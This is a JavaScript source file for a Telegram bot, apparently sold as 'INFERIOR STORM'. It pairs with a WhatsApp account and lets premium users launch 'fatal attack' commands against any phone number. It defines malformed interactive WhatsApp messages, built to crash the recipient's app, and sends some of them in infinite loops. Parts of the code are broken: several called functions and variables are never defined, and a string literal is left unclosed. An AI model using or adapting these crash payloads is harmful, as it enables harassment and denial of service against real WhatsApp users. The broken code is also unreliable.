const { Telegraf, Markup, session } = require("telegraf"); // Tambahkan session dari telegraf
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN } = require("./config");
const crypto = require('crypto');
const premiumFile = './premiumuser.json';
const ownerFile = './owneruser.json';
const TOKENS_FILE = "./tokens.json";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);

bot.use(session());

let Zeph = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const blacklist = ["6142885267", "7275301558", "1376372484"];

const randomImages = [
"https://files.catbox.moe/5rkv9w.jpeg",
"https://files.catbox.moe/5rkv9w.jpeg",
"https://files.catbox.moe/5rkv9w.jpeg",
"https://files.catbox.moe/5rkv9w.jpeg",
"https://files.catbox.moe/5rkv9w.jpeg",
"https://files.catbox.moe/5rkv9w.jpeg",
"https://files.catbox.moe/5rkv9w.jpeg",
"https://files.catbox.moe/5rkv9w.jpeg",
"https://files.catbox.moe/5rkv9w.jpeg",
"https://files.catbox.moe/5rkv9w.jpeg",
];

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

const startSesi = async () => {
    const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Succes Connected',
        }),
    };

    Zeph = makeWASocket(connectionOptions);
    if (usePairingCode && !Zeph.authState.creds.registered) {
        console.clear();
        let phoneNumber = await question(chalk.bold.yellow(`\nMasukan nomor sender!\n\nGunakan WhatsApp Messenger\nJangan menggunakan WhatsApp Bussines\n`));
        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
        const code = await Zeph.requestPairingCode(phoneNumber.trim());
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(chalk.bold.white(`KODE PAIRING ANDA `), chalk.bold.yellow(formattedCode));
    }

    Zeph.ev.on('creds.update', saveCreds);
    store.bind(Zeph.ev);

    Zeph.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
        try {
            Zeph.newsletterFollow("120363373008401043@newsletter");
        } catch (error) {
            console.error('Newsletter follow error:', error);
        }
            isWhatsAppConnected = true;
            console.log(chalk.bold.white('Connected!'));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus.'),
                shouldReconnect ? 'Mencoba untuk menghubungkan ulang...' : 'Silakan login ulang.'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("⛔ Anda bukan owner.");
    }
    next();
};

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan pengguna premium.");
    }
    next();
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("❌ WhatsApp belum terhubung. Silakan hubungkan dengan Pairing Code terlebih dahulu.");
    return;
  }
  next();
};

bot.command('start', async (ctx) => {
    const userId = ctx.from.id.toString();

    if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }

    const RandomBgtJir = getRandomImage();
    const waktuRunPanel = getUptime(); // Waktu uptime panel

    await ctx.replyWithPhoto(RandomBgtJir, {
        caption: `
╔─═⊱    𝐈𝐍𝐅𝐄𝐑𝐈𝐎𝐑 𝐒𝐓𝐎𝐑𝐌= AMPAS  ─═⬡
║𝘁𝗴://𝘂𝘀𝗲𝗿?𝗶𝗱=7941824028)
│ 𝚄𝚜𝚎𝚛 : ${pushname}!*
║ ❏ 𝚂𝚝𝚊𝚝𝚞𝚜 : *${runtime(process.uptime())}*
│ ❏ 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 : *3.5*
║ ❏ 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 : *@Lieangle
┗━━━━━━━━━━━━━━━⬡
╔─═ 𝐈𝐍𝐅𝐄𝐑𝐈𝐎𝐑
║✼ Void-infinity 628xxx
│✼ Titan-Attack 628xxx
║✼ Lotus-Crash 628xxx
│✼ XCall-Crash 628xxx
┗━━━━━━━━━━━━━━━⬡
╔─═──═──═───═──═⬡
║✼ addreseller
│✼ addtoken
║✼ addprem
│✼ delprem
║✼ cekprem
║✼ restart
┗━━━━━━━━━━━━━━━⬡
╔─═ 𝗧𝗵𝗮𝗻𝗸𝘀𝗧𝗼 🎏
║友 _Lieangel ™_
│友 𝗗𝗮𝗻𝗶𝗲𝗹 
║友 MARK Zuckerberg 
│友 Crypto lord 
┗━━━━━━━━━━━━━━━⬡`,
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.url('DEVELOPER', 'https://t.me/Lieangell')]
        ])
    });
});

bot.command("Void-infinity", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/cmd 628XXXX`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`Targeting : ${zepnumb}\nStatus : still in process\nThe process of launching a fatal attack`);

    for (let i = 0; i < 2; i++) {
        await CrashCursor(bijipler);
        await Payload(bijipler);
        await Payload(bijipler);
        await CrashCursor(bijipler);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by zephyrine`
    );
});

bot.command("Titan-Attack", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/cmd 628XXXX`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`Targeting : ${zepnumb}\nStatus : still in process\nThe process of launching a fatal attack`);

    for (let i = 0; i < 2; i++) {
        await CrashCursor(bijipler);
        await Zetx(bijipler);
        await Zetx(bijipler);
        await CrashCursor(bijipler);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by ZullCrazher`
    );
});

bot.command("Lotus-Crash", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/cmd 628XXXX`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`Targeting : ${zepnumb}\nStatus : still in process\nThe process of launching a fatal attack`);

    for (let i = 0; i < 8; i++) {
        await CrashCursor(bijipler);
        await invc(bijipler);
        await invc(bijipler);
        await CrashCursor(bijipler);
        await CrashCursor(bijipler);
        await CrashCursor(bijipler);
        await invc(bijipler);
        await CrashCursor(bijipler);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by ZullCrazher`
    );
});

bot.command("XCall-Crash", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/cmd 628XXXX`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`Targeting : ${zepnumb}\nStatus : still in process\nThe process of launching a fatal attack`);

    for (let i = 0; i < 5; i++) {
        await CrashCursor(bijipler);
        await invc(bijipler);
        await invc(bijipler);
        await CrashCursor(bijipler);
        await CrashCursor(bijipler);
        await CrashCursor(bijipler);
        await CrashCursor(bijipler);
        await CrashCursor(bijipler);
        await CrashCursor(bijipler);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by ZullCrazher`
    );
});


// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command('addprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status premium.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🎉 Pengguna ${userId} sekarang memiliki akses premium!`);
});

// Perintah untuk menghapus pengguna premium (hanya owner)
bot.command('delprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar premium.`);
});

// Perintah untuk mengecek status premium
bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Anda adalah pengguna premium.`);
    } else {
        return ctx.reply(`❌ Anda bukan pengguna premium.`);
    }
});

bot.command('addreseller', async (ctx) => {
    const userId = ctx.from.id.toString();

    if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan fitur ini.");
    }

    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Anda perlu memberikan ID reseller setelah perintah. Contoh: /addreseller 12345");
    }

    const resellerId = args[1];
    if (resellers.includes(resellerId)) {
        return ctx.reply(`❌ Reseller dengan ID ${resellerId} sudah terdaftar.`);
    }

    const success = await addReseller(resellerId);

    if (success) {
        return ctx.reply(`✅ Reseller dengan ID ${resellerId} berhasil ditambahkan.`);
    } else {
        return ctx.reply(`❌ Gagal menambahkan reseller dengan ID ${resellerId}.`);
    }
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('index', (err) => { // 'index' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};



// Command untuk restart
bot.command('restart', (ctx) => {
  const userId = ctx.from.id.toString();
  ctx.reply('Merestart bot...');
  restartBot();
});

async function SPAMNOCLICKTOYA(target) {
    let Msg = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: ["13135550002@s.whatsapp.net"],
                        isForwarded: true,
                        forwardingScore: 999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target,
                        },
                    },
                    body: {
                        text: "HELLO",
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: "" },
                            { name: "call_permission_request", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                        ],
                    },
                },
            },
        },
    };

    // حلقة لا نهائية لإرسال الرسائل باستمرار
    while (true) {
        await toya.relayMessage(target, Msg, { participant: { jid: target } });

        // الانتظار بين كل إرسال حتى لا يحدث ضغط زائد على السيرفر
        await new Promise(resolve => setTimeout(resolve, 1000)); // 1000 مللي ثانية = 1 ثانية
    }
}
async function INFINITYTOYANICLICK(istarget) {
    let Msg = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: ["@s.whatsapp.net"],
                        isForwarded: true,
                        forwardingScore: 999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: isTarget,
                        },
                    },
                    body: {
                        text: "CAN We date",
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: "" },
                            { name: "call_permission_request", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                        ],
                    },
                },
            },
        },
    };

    while (true) {
        await Toya.relayMessage(isTarget, Msg, { participant: { jid: isTarget } });
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}
  async function UniXForceClose(sock, target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "CLAIM YOUR PRICE̵̹͘",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
    console.log("🚀 Memulai sesi WhatsApp...");
    startSesi();

    console.log("BOT connected");
    bot.launch();

    // Membersihkan konsol sebelum menampilkan pesan sukses
    console.clear();
    console.log(chalk.bold.red("\n𝐈𝐍𝐅𝐄𝐑𝐈𝐎𝐑 𝐒𝐓𝐎𝐑𝐌"));
    console.log(chalk.bold.white("DEVELOPER: _Lieangel ™_"));
    console.log(chalk.bold.white("VERSION: 2.5));
    console.log(chalk.bold.white("ACCESS: ") + chalk.bold.green("YES"));
    console.log(chalk.bold.white("STATUS: ") + chalk.bold.green("ONLINE\n\n"));
    console.log(chalk.bold.yellow("THANKS FOR BUYING THIS SCRIPT FROM OWNER/DEVELOPER"));
})();